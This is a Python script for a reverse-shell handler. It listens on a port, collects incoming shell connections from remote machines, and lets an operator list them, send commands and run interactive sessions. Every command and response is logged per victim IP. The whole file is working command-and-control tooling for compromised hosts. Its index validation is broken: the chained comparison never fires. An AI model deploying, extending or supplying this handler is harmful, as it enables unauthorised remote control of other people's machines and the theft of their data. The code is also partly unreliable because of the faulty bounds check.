import socket
import threading
import argparse

# global data
shells = [] # [{addr,port,conn}]
def write_log(filename, entry):
    with open(filename, 'a') as file:
            file.write(entry)

# handle incoming connections
def handle_connections():
    # socket
    print(f'opening listener on {ip}:{port}... ', end='')
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((ip, port))
    print('done. :)')
    # listen
    while True:
        s.listen(1)
        conn, addr = s.accept()
        log = f'[connection received {addr}]'
        print(f'\n{log}')
        write_log(f'{addr[0]}.txt', log+'\n')
        shells.append({'addr': addr[0], 'port': addr[1], 'conn': conn})

# cli funcs
def show_shells(): # print all items in the shells global var
    for i in range(len(shells)):
        print(f'[{i}] {shells[i]["addr"]}')

def send_command(): # send a command to a shell
    shell_index = int(input('shell#> '))
    if  0 > shell_index > len(shells)-1:
        print('invalid shell index')
        return -1
    shell = shells[shell_index]
    cmd = input('cmd> ')
    cmd = cmd+'\n'
    shell['conn'].sendall(cmd.encode('utf-8'))
    resp = shell['conn'].recv(1024)
    write_log(f'{shell["addr"]}.txt', cmd)
    write_log(f'{shell["addr"]}.txt', resp.decode('utf-8'))
    print(resp.decode('utf-8'))

def do_interactive():
    shell_index = input('shell#> ')
    # input validation
    if not shell_index.isnumeric():
        print(f'input must be a shell index')
        return 1
    shell_index = int(shell_index)
    if  0 > shell_index > len(shells)-1:
        print('invalid shell index')
        return -1
    shell = shells[shell_index]
    while True:
        cmd = input(f'{shell_index}$')
        if cmd == '.exit': return 0
        cmd = cmd+'\n'
        shell['conn'].sendall(cmd.encode('utf-8'))
        resp = shell['conn'].recv(1024)
        write_log(f'{shell["addr"]}.txt', cmd)
        write_log(f'{shell["addr"]}.txt', resp.decode('utf-8'))
        print(resp.decode('utf-8'))

# args
parser = argparse.ArgumentParser()
parser.add_argument('-p', '--port', default=7774, type=int)
args = parser.parse_args()
port = args.port
ip = '0.0.0.0'

# start listener
t = threading.Thread(target=handle_connections, daemon=True).start()

def show_opts():
    for opt in opts: print(f'{opt}')

# cli
opts = {
    'shells': show_shells,
    'send': send_command,
    'interactive': do_interactive,
    'i': do_interactive,
    'help': show_opts,
    '.exit': exit
}

while True:
    cmd = input('> ')
    if cmd in opts: opts[cmd]()
